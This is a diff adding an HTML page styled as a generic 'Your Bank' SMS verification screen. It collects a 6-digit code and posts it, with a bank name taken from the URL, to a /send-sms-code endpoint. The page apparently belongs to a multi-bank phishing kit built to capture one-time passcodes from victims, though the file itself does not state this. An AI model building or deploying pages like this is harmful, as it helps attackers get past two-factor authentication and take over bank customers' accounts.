@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SMS Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f7f9;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 500px;
+            background-color: #ffffff;
+            padding: 20px 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            margin: 60px auto;
+        }
+
+        h1 {
+            font-size: 24px;
+            text-align: center;
+            color: #003e6b;
+        }
+
+        .message {
+            font-size: 16px;
+            color: #555;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .input-section {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .input-section input {
+            width: 80%;
+            padding: 12px;
+            margin-top: 10px;
+            font-size: 18px;
+            border-radius: 6px;
+            border: 1px solid #ccc;
+        }
+
+        .continue-button {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            background-color: #007bff;
+            color: white;
+            font-size: 18px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+
+        .continue-button:hover {
+            background-color: #0056b3;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 14px;
+            color: #777;
+            margin-top: 30px;
+        }
+
+        .footer a {
+            text-decoration: none;
+            color: #007bff;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>Verify Your Identity</h1>
+        <div class="message">
+            Please enter the 6-digit code sent to your mobile number.
+        </div>
+        <div class="input-section">
+            <label for="sms-code">Enter the 6-digit code</label><br>
+            <input type="text" id="sms-code" placeholder="Enter code" maxlength="6" />
+        </div>
+        <button class="continue-button" onclick="submitCode()">Continue</button>
+    </div>
+
+    <div class="footer">
+        <p>&copy; 2000 — 2025 Your Bank. All rights reserved.
+            <a href="#">Privacy Policy</a> | <a href="#">Terms of Use</a>
+        </p>
+    </div>
+
+    <script>
+        function submitCode() {
+            const code = document.getElementById('sms-code').value.trim();
+            const bank = new URLSearchParams(window.location.search).get('bank') || 'unknown';
+
+            if (code.length !== 6 || isNaN(code)) {
+                alert("Please enter a valid 6-digit code.");
+                return;
+            }
+
+            fetch('/send-sms-code', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ code, bank })
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        alert("Code verified! Proceeding...");
+                    } else {
+                        alert("Verification failed.");
+                    }
+                })
+                .catch(err => {
+                    console.error('Error:', err);
+                    alert("Error sending code.");
+                });
+        }
+    </script>
+</body>
+
+</html>
